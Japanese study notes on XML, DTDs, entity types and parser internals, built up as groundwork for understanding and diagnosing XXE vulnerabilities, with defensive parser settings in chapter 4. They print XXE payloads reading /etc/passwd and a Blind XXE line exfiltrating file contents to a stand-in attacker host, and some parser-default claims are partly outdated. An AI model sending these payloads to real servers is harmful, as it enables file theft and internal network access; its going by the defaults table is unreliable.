# 第1章：XML の基本構造

## 1-1. XML とは何か

**XML（eXtensible Markup Language）** は、データを「意味のある構造」で表現するためのマークアップ言語。

### HTML との比較

| 観点 | HTML | XML |
|------|------|-----|
| 目的 | データを**表示**する | データを**表現・転送**する |
| タグ | 決められたタグのみ | 自分でタグを定義できる |
| 厳密さ | 比較的ゆるい | 厳密な構文ルールがある |

### JSON との比較

| 差別化点 | 説明 |
|---------|------|
| **スキーマ・バリデーション機能（DTD）** | データの「正しさ」を定義・検証できる ⚠️ XXEの舞台 |
| **名前空間（Namespace）** | 異なるシステムのタグが混在しても衝突しない |
| **コメント・処理命令** | `<!-- -->` コメントや `<?...?>` 処理命令を持てる |
| **歴史的な普及経緯** | SOAPなど企業間連携プロトコルはXMLベースで設計された |

> **ポイント**：JSON でもキーと値でメタ情報は表現できる。属性値の有無は本質的な差別化点ではない。

---

## 1-2. XML の基本構造

```xml
<?xml version="1.0" encoding="UTF-8"?>   ← XML宣言
<user>                                     ← ルート要素（開始タグ）
  <name>Taro</name>                        ← 子要素
  <age>30</age>
  <email>taro@example.com</email>
</user>                                    ← ルート要素（終了タグ）
```

---

## 1-3. 構成要素の詳細

### 1-3-1. XML 宣言

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

| 部分 | 意味 |
|------|------|
| `version="1.0"` | XML のバージョン指定 |
| `encoding="UTF-8"` | 文字エンコーディングの指定 |

- 必須ではないが、先頭に書くのが慣例
- **パーサーはまずここを読んで、どう解釈するか決める**

---

### 1-3-2. 要素（Element）

```xml
<name>Taro</name>
```

- `<name>` が**開始タグ**、`</name>` が**終了タグ**
- タグで囲まれた `Taro` が**コンテンツ（内容）**
- 開始タグと終了タグは**必ずペア**（HTML より厳密）

#### 入れ子構造（ネスト）

```xml
<user>
  <profile>
    <name>Taro</name>   ← profileの子、userの孫
  </profile>
</user>
```

- 必ず**1つのルート要素**がすべてを包む
- 要素は何層でも入れ子にできる

---

### 1-3-3. 属性（Attribute）

```xml
<user id="001" role="admin">Taro</user>
```

- 開始タグの中に `属性名="値"` の形で書く
- 要素に**メタ情報**を付加する役割
- 値は必ず `"..."` または `'...'` で囲む

#### 要素 vs 属性（どちらで表現するか）

```xml
<!-- 属性で表現 -->
<user id="001">Taro</user>

<!-- 要素で表現 -->
<user>
  <id>001</id>
  <name>Taro</name>
</user>
```

> 一般的な使い分け：**構造的なデータ → 要素 / 識別子・補足情報 → 属性**

---

### 1-3-4. XML の厳密なルール（Well-formed XML）

```xml
<!-- NG：タグが閉じていない -->
<name>Taro

<!-- NG：入れ子が崩れている -->
<user><name>Taro</user></name>

<!-- NG：ルート要素が複数 -->
<user>Taro</user>
<user>Hanako</user>

<!-- OK：ルート要素で包む -->
<users>
  <user>Taro</user>
  <user>Hanako</user>
</users>
```

---

### 1-3-5. 特殊文字のエスケープ

| 文字 | エスケープ | 理由 |
|------|-----------|------|
| `<` | `&lt;` | タグの開始と誤認される |
| `>` | `&gt;` | タグの終了と誤認される |
| `&` | `&amp;` | エンティティ参照の開始と誤認される |
| `"` | `&quot;` | 属性値の区切りと誤認される |
| `'` | `&apos;` | 属性値の区切りと誤認される |

> ⚠️ **重要**：`&` で始まり `;` で終わる記法 → これが次章「**エンティティ**」の入口

---

## 1-4. XML 処理の全体像

```
XMLデータ → [XMLパーサー] → アプリケーションが使えるデータ構造
```

> **XXE 攻撃は「パーサーが処理する段階」で起きる**。パーサーが何を・どう処理するかが攻撃の核心。

---

## 1-5. 自身の認識

### 認識（原文）

> XMLは、データを意味のある構造で表現するための言語である。タグでデータの構成や構造を定義することにより、コンピューターがデータ構造の定義を理解できるようになる。JSONのようなデータの伝達の役割を果たすが、JSONとの差別化点は、タグによる属性値の付加が可能であるため、要素となるデータの詳細な情報を記述できる点である。

### 評価

| 認識の内容 | 正誤 | コメント |
|-----------|------|---------|
| データを意味のある構造で表現する言語 | ✅ 正しい | 本質を捉えている |
| タグでデータ構造を定義し、コンピューターが理解できる | ✅ 正しい | 正確 |
| JSON のようなデータ伝達の役割 | ✅ 正しい | 正確 |
| JSON との差別化点 = 属性値の付加 | ⚠️ 不正確 | 補足が必要（下記参照） |

### 補足1：属性値は差別化の本質ではない

JSON でも同様の情報を表現できる：

```json
{ "user": { "id": "001", "name": "Taro" } }
```

```xml
<user id="001">Taro</user>
```

→ 表現できる情報量に本質的な差はない。

### 補足2：「コンピューターが理解する」の主体はパーサー

「コンピューター」ではなく、より正確には **XML パーサー** というソフトウェアがタグを解析・解釈する。

### ✅ 修正版の認識

> XML は、タグでデータ構造を定義し、**XML パーサーを通じて**アプリケーションが解釈できる形にするデータ表現言語である。JSON との差別化点は属性値だけでなく、**DTD によるスキーマ定義・バリデーション機能**にあり、これが XXE の核心につながる。

# 第2章：DTD（Document Type Definition）

## 2-1. DTD とは何か

**DTD（Document Type Definition）** は、XML 文書の「設計図・ルール定義」。

> 「この XML はどんな要素を持ち、どんな構造であるべきか」を定義するもの

XML 自体はタグを自由に定義できる柔軟な言語。その分、**「どんな XML が正しいのか」を別途定義する仕組みが必要**になる。それが DTD。

### DTD がない場合・ある場合の違い

```xml
<!-- DTD なし：構造のルールが何もない状態 -->
<?xml version="1.0"?>
<user>
  <name>Taro</name>
</user>
```

```xml
<!-- DTD あり：構造のルールが定義されている状態 -->
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ELEMENT user (name, age)>
  <!ELEMENT name (#PCDATA)>
  <!ELEMENT age  (#PCDATA)>
]>
<user>
  <name>Taro</name>
  <age>30</age>
</user>
```

> DTD があると、パーサーは「この XML は定義通りに書かれているか」を検証できる。

---

## 2-2. DOCTYPE 宣言

DTD は `<!DOCTYPE>` という宣言から始まる。

```xml
<!DOCTYPE ルート要素名 [ DTDの内容 ]>
```

| 部分 | 意味 |
|------|------|
| `!DOCTYPE` | DTD の宣言であることを示す |
| `ルート要素名` | この XML のルート要素の名前 |
| `[ ... ]` | DTD の定義内容（内部 DTD の場合） |

---

## 2-3. 内部 DTD と外部 DTD

### 内部 DTD：XML ファイルの中に直接書く

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ELEMENT user (name)>
  <!ELEMENT name (#PCDATA)>
]>
<user>
  <name>Taro</name>
</user>
```

### 外部 DTD：別ファイルに定義を書いて参照する

```xml
<?xml version="1.0"?>
<!DOCTYPE user SYSTEM "user.dtd">
<user>
  <name>Taro</name>
</user>
```

別ファイル `user.dtd` の中身：

```
<!ELEMENT user (name)>
<!ELEMENT name (#PCDATA)>
```

### 内部 DTD vs 外部 DTD

| 観点 | 内部 DTD | 外部 DTD |
|------|---------|---------|
| 定義場所 | XML ファイル内 | 外部ファイル |
| 再利用性 | 低い（その XML 専用） | 高い（複数の XML で共有可能） |
| `SYSTEM` キーワード | 不要 | 必要 |

> ⚠️ **セキュリティ上の注目点**：`SYSTEM` キーワードに続く URI は**ローカルファイルや外部 URL** を指定できる。これが後に XXE の核心となる。

---

## 2-4. SYSTEM と PUBLIC

外部 DTD を参照する際のキーワードは2種類ある。

```xml
<!-- SYSTEM：ファイルパスや URL で直接指定 -->
<!DOCTYPE user SYSTEM "http://example.com/user.dtd">
<!DOCTYPE user SYSTEM "file:///etc/passwd">

<!-- PUBLIC：公開識別子（名前）＋ URL で指定 -->
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
  "http://www.w3.org/TR/html4/strict.dtd">
```

| キーワード | 用途 |
|-----------|------|
| `SYSTEM` | 独自の DTD をパスや URL で直接指定 |
| `PUBLIC` | 標準化された DTD を公開識別子で指定 |

> ⚠️ `SYSTEM "file:///etc/passwd"` のように書くと、パーサーがそのファイルを読みに行く。これが XXE の入口。

---

## 2-5. DTD で定義できるもの

### 2-5-1. 要素の定義（`!ELEMENT`）

```xml
<!ELEMENT user (name, age)>   ← user は name と age を子に持つ
<!ELEMENT name (#PCDATA)>     ← name はテキストデータを持つ
<!ELEMENT age  (#PCDATA)>
```

| 記法 | 意味 |
|------|------|
| `(name, age)` | name の後に age が必須 |
| `(#PCDATA)` | テキストデータを持つ |
| `(name)+` | name が1回以上 |
| `(name)*` | name が0回以上 |
| `(name)?` | name が0または1回 |

### 2-5-2. 属性の定義（`!ATTLIST`）

```xml
<!ATTLIST user id CDATA #REQUIRED>
```

| 部分 | 意味 |
|------|------|
| `user` | 対象の要素名 |
| `id` | 属性名 |
| `CDATA` | 値の型（文字データ） |
| `#REQUIRED` | 必須属性 |

### 2-5-3. エンティティの定義（`!ENTITY`）← XXE の核心

```xml
<!ENTITY name "Taro">                          ← 内部エンティティ
<!ENTITY data SYSTEM "file:///etc/passwd">     ← 外部エンティティ
```

> **ここが XXE の核心**。外部エンティティは `SYSTEM` キーワードで任意のファイルや URL を参照できる。パーサーがこれを展開する際にファイルを読み込む動作が攻撃に悪用される。

---

## 2-6. Valid XML とは

DTD が定義されており、かつ XML がその定義通りに書かれている状態を **Valid（妥当）** と言う。

```
Well-formed（構文的に正しい） ＋ DTD の定義に従っている ＝ Valid
```

| 状態 | 意味 |
|------|------|
| Well-formed | タグのペアや入れ子など、XML の構文ルールを満たしている |
| Valid | Well-formed かつ、DTD の定義通りの構造になっている |

---

## 2-7. XXE との接続：全体の構図

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">   ← 外部エンティティを定義
]>
<foo>&xxe;</foo>                               ← エンティティを参照（展開）
```

流れ：

```
1. 攻撃者が細工した XML を送信
2. パーサーが DOCTYPE を読み込む
3. SYSTEM の URI（file:///etc/passwd）に従いファイルを取得
4. &xxe; の部分にファイルの内容が展開される
5. アプリがその内容をレスポンスに含めて返す → 情報漏洩
```

---

## 2-8. 第2章まとめ

```
DTD
├─ 定義場所：内部 DTD / 外部 DTD（SYSTEM キーワードで URI 指定）
├─ 定義できるもの
│     ├─ !ELEMENT：要素の構造ルール
│     ├─ !ATTLIST：属性のルール
│     └─ !ENTITY：エンティティ定義 ← XXEの核心
└─ パーサーは DTD の指示に従ってエンティティを展開する
```

# 第3章：エンティティ（Entity）の概念

## 3-1. エンティティとは何か

**エンティティ** とは、XML における「名前付きの値の入れ物」。プログラミングでいう **変数** に近い概念。

```
変数のイメージ：
name = "Taro"   →   &name; と書くと "Taro" に展開される
```

```xml
<!ENTITY name "Taro">   ← 定義
<user>&name;</user>     ← 参照（展開）
↓ パーサーが処理すると
<user>Taro</user>       ← 展開後
```

---

## 3-2. エンティティの分類全体像

エンティティは **2つの軸** で分類される。

```
エンティティ
├─ 値の場所による分類
│     ├─ 内部エンティティ（値を直接定義）
│     └─ 外部エンティティ（値を外部から取得）← XXEの核心
│
└─ 使用できる場所による分類
      ├─ 一般エンティティ（XML本文で使用）
      └─ パラメータエンティティ（DTD内でのみ使用）
```

この2軸の組み合わせで、合計4種類のエンティティが存在する。

---

## 3-3. 内部エンティティ

値を **DTD の中に直接** 書くエンティティ。

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY greeting "Hello, World!">
]>
<user>&greeting;</user>
↓ 展開後
<user>Hello, World!</user>
```

| 項目 | 内容 |
|------|------|
| 定義方法 | `<!ENTITY 名前 "値">` |
| 値の場所 | DTD 内に直接記述 |
| 外部アクセス | なし |
| 危険度 | 低い |

---

## 3-4. 外部エンティティ

値を **ファイルや URL などの外部リソース** から取得するエンティティ。

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY ext SYSTEM "http://example.com/data.txt">
]>
<user>&ext;</user>
↓ パーサーが http://example.com/data.txt を取得して展開
<user>（data.txtの内容）</user>
```

### SYSTEM で使える URI スキーム

```xml
<!ENTITY e SYSTEM "file:///etc/passwd">       ← ローカルファイル
<!ENTITY e SYSTEM "http://internal.server/">  ← 内部 HTTP サーバー
<!ENTITY e SYSTEM "https://external.com/">    ← 外部 HTTP サーバー
```

| 項目 | 内容 |
|------|------|
| 定義方法 | `<!ENTITY 名前 SYSTEM "URI">` |
| 値の場所 | 外部ファイルや URL |
| 外部アクセス | **あり（パーサーがリクエストを発行）** |
| 危険度 | **高い ← XXE の直接の原因** |

> ⚠️ パーサーは SYSTEM の URI を**サーバー側から**アクセスする。
> 攻撃者は、サーバーを踏み台にして内部リソースへアクセスできる。

---

## 3-5. 一般エンティティ

**XML 本文（コンテンツ部分）** で使用するエンティティ。

```xml
<!ENTITY name "Taro">       ← 定義（DTD内）
<user>&name;</user>         ← 参照（XML本文内）
      ↑
   & で始まり ; で終わる記法 = 一般エンティティの参照
```

第1章のエスケープ文字もこの一般エンティティ：

```xml
&lt;   → <
&gt;   → >
&amp;  → &
```

---

## 3-6. パラメータエンティティ

**DTD の内部でのみ** 使用できる特殊なエンティティ。

```xml
<!ENTITY % param "<!ENTITY inner 'value'>">   ← % で定義
%param;                                        ← % で参照（DTD内のみ）
```

| 項目 | 一般エンティティ | パラメータエンティティ |
|------|----------------|----------------------|
| 定義 | `<!ENTITY 名前 "値">` | `<!ENTITY % 名前 "値">` |
| 参照記法 | `&名前;` | `%名前;` |
| 使用場所 | XML 本文 | DTD 内のみ |

### なぜ XXE で重要か

パラメータエンティティは **DTD 内で別のエンティティを動的に定義できる** ため、攻撃をより高度にできる。

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil 'http://attacker.com/?d=%file;'>">
%eval;
&exfil;
```

> これが **Blind XXE**（レスポンスに値が直接出ない場合の攻撃）で使われる手法。

---

## 3-7. エンティティの展開タイミング

```
① XML をパーサーに渡す
② パーサーが DOCTYPE を読み込む
③ エンティティの定義を登録する
④ XML 本文を読み進める
⑤ &name; などの参照に出会う
⑥ 定義に従って値を展開する（外部エンティティならこの時点でアクセス発生）
⑦ 展開後の値がアプリケーションに渡る
```

> ⚠️ 外部エンティティの場合、⑥の展開時に**サーバーが外部へリクエストを発行する**。
> アプリのコードが何も悪いことをしていなくても、パーサーが勝手に動く。

---

## 3-8. 4種類の組み合わせ整理

| 種類 | 定義 | 参照 | 使用場所 | XXE との関係 |
|------|------|------|---------|------------|
| 内部・一般 | `<!ENTITY n "val">` | `&n;` | XML 本文 | 無害 |
| **外部・一般** | `<!ENTITY n SYSTEM "URI">` | `&n;` | XML 本文 | **XXE の基本形** |
| 内部・パラメータ | `<!ENTITY % n "val">` | `%n;` | DTD 内 | 単体では無害 |
| **外部・パラメータ** | `<!ENTITY % n SYSTEM "URI">` | `%n;` | DTD 内 | **Blind XXE で使用** |

---

## 3-9. XXE との接続：攻撃の最小構成

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">   ← 外部・一般エンティティ定義
]>
<foo>&xxe;</foo>                               ← XML本文で参照・展開
```

```
攻撃の流れ：
1. 攻撃者がこの XML をアプリに送信
2. パーサーが DOCTYPE を処理
3. SYSTEM "file:///etc/passwd" に従い、サーバーがファイルを読む
4. &xxe; の位置にファイル内容が展開される
5. アプリがその内容をレスポンスに含める
6. 攻撃者がサーバー内のファイルを取得できる
```

---

## 3-10. 第3章まとめ

```
エンティティ
├─ 内部エンティティ：値を DTD 内に直接定義（安全）
├─ 外部エンティティ：SYSTEM で外部リソースを参照（← XXE の原因）
├─ 一般エンティティ：&name; 形式で XML 本文に展開
└─ パラメータエンティティ：%name; 形式で DTD 内でのみ展開（Blind XXE で活用）

核心：外部エンティティをパーサーが展開する際に、
      サーバーが任意のファイルや URL へアクセスしてしまう
```

# 第4章：XML パーサーの動作原理

## 4-1. XML パーサーとは何か

**XML パーサー** とは、XML データを読み込み、アプリケーションが扱えるデータ構造に変換するソフトウェア。

```
XMLテキスト（文字列）→ [XMLパーサー] → アプリが使えるデータ構造
```

アプリケーションは XML を直接読むのではなく、**必ずパーサーを経由して**データを受け取る。

> XXE はこの「パーサーが処理する段階」で発生する。アプリのコードに問題がなくても、パーサーの動作そのものが攻撃に悪用される。

---

## 4-2. パーサーの2つの種類

### DOM パーサー（Document Object Model）

```
XMLデータ → XML全体を読み込む → メモリ上にツリー構造を構築 → アプリがツリーを自由に操作
```

```xml
<user>
  <name>Taro</name>
  <age>30</age>
</user>
```

```
メモリ上のツリー：
user
├─ name → "Taro"
└─ age  → "30"
```

| 特徴 | 内容 |
|------|------|
| 処理方法 | XML 全体を一度に読み込む |
| メモリ | 全体をメモリに保持するため使用量が多い |
| 操作性 | ツリーを自由に行き来できる |
| XXE との関係 | **外部エンティティを含む DTD を丸ごと処理するため XXE の影響を受けやすい** |

### SAX パーサー（Simple API for XML）

```
XMLデータを先頭から1行ずつ読む → タグや値に出会うたびにイベント発火 → アプリがイベントを受け取って処理
```

```
読み進める順：
<user>     → 「開始タグ: user」イベント
<name>     → 「開始タグ: name」イベント
Taro       → 「テキスト: Taro」イベント
</name>    → 「終了タグ: name」イベント
...
```

| 特徴 | 内容 |
|------|------|
| 処理方法 | 先頭から順番に読み進める |
| メモリ | 少量（全体を保持しない） |
| 操作性 | 後戻りできない |
| XXE との関係 | **エンティティ展開はパーサーレベルで行われるため、SAX でも XXE の影響を受ける** |

> ⚠️ 「SAX だから安全」ではない。エンティティの展開はパーサーの内部処理であり、DOM・SAX どちらでも発生する。

---

## 4-3. パーサーの処理ステップ

```
Step 1: XML宣言の読み込み
        <?xml version="1.0" encoding="UTF-8"?>
        → 文字エンコーディング・バージョンを把握

Step 2: DOCTYPE 宣言の処理          ← ここが XXE の舞台
        <!DOCTYPE foo [ ... ]>
        → 内部 DTD を読み込む
        → 外部 DTD があれば取得しに行く
        → エンティティ定義を登録する

Step 3: XML 本文の解析
        <foo>&xxe;</foo>
        → タグを認識してツリー or イベントを生成

Step 4: エンティティの展開           ← ここで外部アクセスが発生
        &xxe; に出会う
        → Step2 で登録した定義を参照
        → SYSTEM URI があれば外部リソースを取得
        → 取得した内容を展開して本文に埋め込む

Step 5: 完成したデータをアプリに渡す
```

> **Step 2 と Step 4 が XXE の核心**。パーサーが DOCTYPE を「信頼して処理する」ことと、エンティティを「自動的に展開する」ことが組み合わさって攻撃が成立する。

---

## 4-4. エンティティ展開の詳細動作

```xml
<!DOCTYPE foo [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<foo>&secret;</foo>
```

```
パーサー内部の動作：

① <!ENTITY secret SYSTEM "file:///etc/passwd"> を読む
        ↓
② エンティティ登録テーブルに記録する
   { "secret": { type: "external", uri: "file:///etc/passwd" } }
        ↓
③ <foo> を読む
        ↓
④ &secret; に出会う
        ↓
⑤ 登録テーブルを参照 → 外部エンティティと判定
        ↓
⑥ "file:///etc/passwd" へアクセス（サーバー上で実行）
        ↓
⑦ ファイル内容を取得
   root:x:0:0:root:/root:/bin/bash ...
        ↓
⑧ &secret; の位置に取得内容を埋め込む
        ↓
⑨ アプリに <foo>root:x:0:0:root:/root:/bin/bash...</foo> を渡す
```

> ⚠️ ⑥のアクセスは **サーバー（アプリが動いているマシン）から発生**する。
> 攻撃者のブラウザからではなく、**サーバー自身が**ファイルを読んでいる。

---

## 4-5. なぜデフォルトで外部エンティティを処理するのか

```
XML が設計された時代（1990年代後半）
    ↓
外部エンティティは「便利な機能」として設計された
（DTD を外部ファイルで共有する、データを外部から参照するなど）
    ↓
当時はインターネットからの悪意ある入力をそれほど考慮していなかった
    ↓
「デフォルト有効」のまま広く普及した
    ↓
現在：デフォルト有効のパーサーが多数存在 → XXE 脆弱性の温床
```

> これがインジェクション系脆弱性の典型的なパターン。
> **「便利な機能」が、外部からの悪意ある入力と組み合わさると脆弱性になる。**

---

## 4-6. 代表的なパーサーとデフォルト設定

| 言語 | パーサー | デフォルトで外部エンティティ処理 |
|------|---------|-------------------------------|
| Java | DocumentBuilderFactory | **有効** |
| Java | SAXParserFactory | **有効** |
| PHP | simplexml_load_string | **有効** |
| Python | xml.etree.ElementTree | 無効（比較的安全） |
| Python | lxml | **有効** |
| .NET | XmlDocument | **有効**（旧バージョン） |

> ほとんどの主要パーサーがデフォルト有効。
> 開発者が意識して無効化しない限り、XXE 脆弱性が生まれる。

---

## 4-7. パーサーレベルでの対策（診断視点）

「対策済みかどうか」を診断時に判断するための確認ポイント。

### Java（DocumentBuilderFactory）

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

### PHP

```php
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($input);
```

### Python（lxml）

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

> **診断視点**：これらの設定がされていなければ、脆弱と判断できる。

## 4-8. XXE との接続：全体の因果関係

```
攻撃者が細工した XML を送信
        ↓
アプリが XML をパーサーに渡す
        ↓
パーサーが DOCTYPE を信頼して処理する（Step 2）
        ↓
外部エンティティの定義が登録される
        ↓
パーサーが本文を処理し &xxe; に出会う（Step 4）
        ↓
サーバーが SYSTEM URI へアクセスする
  ├─ file:///etc/passwd → ファイル読み取り
  └─ http://内部サーバー/ → 内部ネットワークへの到達（SSRF）
        ↓
展開された内容がアプリに渡る
        ↓
アプリがレスポンスに含めて返す → 情報漏洩
```

